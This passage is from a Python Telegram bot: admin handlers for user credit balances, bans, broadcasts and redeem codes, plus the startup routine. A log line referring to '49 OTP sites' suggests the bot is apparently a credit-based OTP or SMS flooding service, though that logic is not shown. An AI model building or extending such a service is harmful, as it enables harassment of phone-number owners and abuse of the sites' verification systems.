        user_id = int(message.text.strip())
        await state.update_data(u_id=user_id)
        await message.answer("💰 Enter **Amount**:")
        await state.set_state(AdminState.add_amount)
    except ValueError:
        await message.answer("❌ Invalid Telegram ID. Please enter a number.")
        await state.clear()

@dp.message(AdminState.add_amount)
async def add_a(message: types.Message, state: FSMContext):
    data = await state.get_data()
    user_id = data['u_id']
    try:
        amount = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Invalid amount. Please enter a number.")
        await state.clear()
        return
    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,)) as cur:
            if not await cur.fetchone():
                await message.answer(f"❌ User ID {user_id} not found.")
                await state.clear()
                return
        await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
        await db.commit()
    await message.answer(f"✅ Added {amount} credits to user {user_id}.")
    await state.clear()

@dp.message(AdminState.rem_id)
async def rem_i(message: types.Message, state: FSMContext):
    try:
        user_id = int(message.text.strip())
        await state.update_data(u_id=user_id)
        await message.answer("💰 Enter **Amount**:")
        await state.set_state(AdminState.rem_amount)
    except ValueError:
        await message.answer("❌ Invalid Telegram ID. Please enter a number.")
        await state.clear()

@dp.message(AdminState.rem_amount)
async def rem_a(message: types.Message, state: FSMContext):
    data = await state.get_data()
    user_id = data['u_id']
    try:
        amount = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Invalid amount.")
        await state.clear()
        return
    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            if not row:
                await message.answer(f"❌ User ID {user_id} not found.")
                await state.clear()
                return
            if row[0] < amount:
                await message.answer(f"❌ User has only {row[0]} credits. Cannot remove {amount}.")
                await state.clear()
                return
        await db.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, user_id))
        await db.commit()
    await message.answer(f"✅ Removed {amount} credits from user {user_id}.")
    await state.clear()

@dp.message(AdminState.ban_id)
async def ban_i(message: types.Message, state: FSMContext):
    try:
        user_id = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Invalid ID.")
        await state.clear()
        return
    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,)) as cur:
            if not await cur.fetchone():
                await message.answer(f"❌ User {user_id} not found.")
                await state.clear()
                return
        await db.execute("UPDATE users SET status = 'banned' WHERE user_id = ?", (user_id,))
        await db.commit()
    await message.answer(f"🚫 User {user_id} banned.")
    await state.clear()

@dp.message(AdminState.unban_id)
async def unban_i(message: types.Message, state: FSMContext):
    try:
        user_id = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Invalid ID.")
        await state.clear()
        return
    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,)) as cur:
            if not await cur.fetchone():
                await message.answer(f"❌ User {user_id} not found.")
                await state.clear()
                return
        await db.execute("UPDATE users SET status = 'active' WHERE user_id = ?", (user_id,))
        await db.commit()
    await message.answer(f"✅ User {user_id} unbanned.")
    await state.clear()

@dp.message(AdminState.broadcast_msg)
async def bc_msg(message: types.Message, state: FSMContext):
    broadcast_text = message.text
    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute("SELECT user_id FROM users") as cur:
            rows = await cur.fetchall()
    await message.answer(f"⏳ Broadcasting to {len(rows)} users...")
    success = 0
    for row in rows:
        try:
            await bot.send_message(row[0], f"📢 **Admin Message:**\n\n{broadcast_text}")
            success += 1
            await asyncio.sleep(0.05)
        except Exception:
            pass
    await message.answer(f"✅ Sent to {success} users.")
    await state.clear()

@dp.message(AdminState.code_name)
async def c_name(message: types.Message, state: FSMContext):
    await state.update_data(c_name=message.text.strip())
    await message.answer("💰 Enter **Amount**:")
    await state.set_state(AdminState.code_amount)

@dp.message(AdminState.code_amount)
async def c_amt(message: types.Message, state: FSMContext):
    try:
        amount = int(message.text.strip())
        await state.update_data(c_amt=amount)
        await message.answer("👥 How many **Users**? (usages):")
        await state.set_state(AdminState.code_usages)
    except ValueError:
        await message.answer("❌ Invalid amount. Please enter a number.")
        await state.clear()

@dp.message(AdminState.code_usages)
async def c_use(message: types.Message, state: FSMContext):
    data = await state.get_data()
    code = data['c_name']
    amount = data['c_amt']
    try:
        usages = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Invalid number. Please enter a number.")
        await state.clear()
        return
    async with aiosqlite.connect("bot_database.db") as db:
        try:
            await db.execute("INSERT INTO redeem_codes (code, amount, usages) VALUES (?, ?, ?)", (code, amount, usages))
            await db.commit()
            await message.answer(f"✅ **Code Created!** `{code}` with {usages} uses.")
        except aiosqlite.IntegrityError:
            await message.answer(f"❌ Code '{code}' already exists.")
    await state.clear()

# ---------- মেইন ----------
async def main():
    await init_db()
    logging.info("✅ Bot started successfully with 49 OTP sites!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
